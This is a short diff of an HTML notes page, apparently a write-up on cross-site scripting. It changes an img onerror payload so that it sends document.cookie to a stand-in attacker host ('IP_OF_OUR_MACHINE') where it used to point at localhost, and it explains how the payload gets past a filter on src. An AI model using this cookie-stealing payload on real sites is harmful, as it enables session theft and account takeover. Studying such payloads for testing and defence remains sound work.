@@ -9,6 +9,6 @@
 Spoiler: wont work (maybe src string concat not allowed)</li>
 <br>
 <h4>IMG onerror payload:</h4>
-<pre><code style="color:Green">&lt;img src=x onerror=this.src=&quot;http://localhost/?cookie=&quot;+document.cookie /&gt;</code></pre>
+<pre><code style="color:Green">&lt;img src=x onerror=this.src=&quot;http://IP_OF_OUR_MACHINE/?cookie=&quot;+document.cookie /&gt;</code></pre>
 <br>
 Since js is not allowed (black-flagged) in img src, we can trigger it in the error message
